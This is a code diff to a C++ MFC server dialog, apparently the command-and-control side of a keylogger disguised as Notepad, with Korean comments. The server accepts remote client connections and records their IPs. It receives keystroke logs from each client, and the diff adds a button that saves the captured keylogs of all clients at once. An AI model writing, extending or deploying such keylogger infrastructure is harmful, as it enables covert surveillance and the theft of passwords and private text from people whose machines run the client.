@@ -67,6 +67,7 @@ BEGIN_MESSAGE_MAP(CNotepadMasterServerDlg, CDialogEx)
 	ON_WM_PAINT()
 	ON_WM_QUERYDRAGICON()
 	ON_NOTIFY(NM_DBLCLK, IDC_LIST_CLIENTS, &CNotepadMasterServerDlg::OnDblclkListClients)
+	ON_BN_CLICKED(IDC_BUTTON_SAVE_GLOBAL_KEYLOGS, &CNotepadMasterServerDlg::OnBnClickedButtonSaveGlobalKeylogs)
 END_MESSAGE_MAP()
 
 
@@ -188,7 +189,7 @@ void CNotepadMasterServerDlg::ClientAccept()
 {
 	// TODO: 여기에 구현 코드 추가.
 	CClientSocket* newsocket = new CClientSocket(this);
-	CClient* newview = new CClient;
+	CClient* newview = new CClient(m_list_clients.GetItemCount() + 1);
 
 	if (!m_listen_socket->Accept(*newsocket))
 	{
@@ -203,7 +204,7 @@ void CNotepadMasterServerDlg::ClientAccept()
 
 	CString temp;
 	UINT index = m_list_clients.GetItemCount();
-	temp.Format(L"%d", m_list_clients.GetItemCount() + 1);
+	temp.Format(L"%d", index + 1);
 	m_list_clients.InsertItem(index, temp , 0);
 	m_list_clients.SetItemText(index, 1, IP);
 	m_list_clients.SetItemText(index, 2, L"Internal IP");
@@ -261,4 +262,14 @@ void CNotepadMasterServerDlg::ReceiveKeylog(CClientSocket* pObj, PDUKeylog* pdu)
 
 	m_client_list[index]->ReceiveKeylog(pdu);
 	return;
+}
+
+/* 모든 클라이언트의 키로그 모두 저장 */
+void CNotepadMasterServerDlg::OnBnClickedButtonSaveGlobalKeylogs()
+{
+	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
+	for (int i = 0; i < m_client_list.size(); i++)
+		m_client_list[i]->SaveKeylogs();
+
+	MessageBox(_T("저장되었습니다"), _T("확인"), MB_OK);
 }
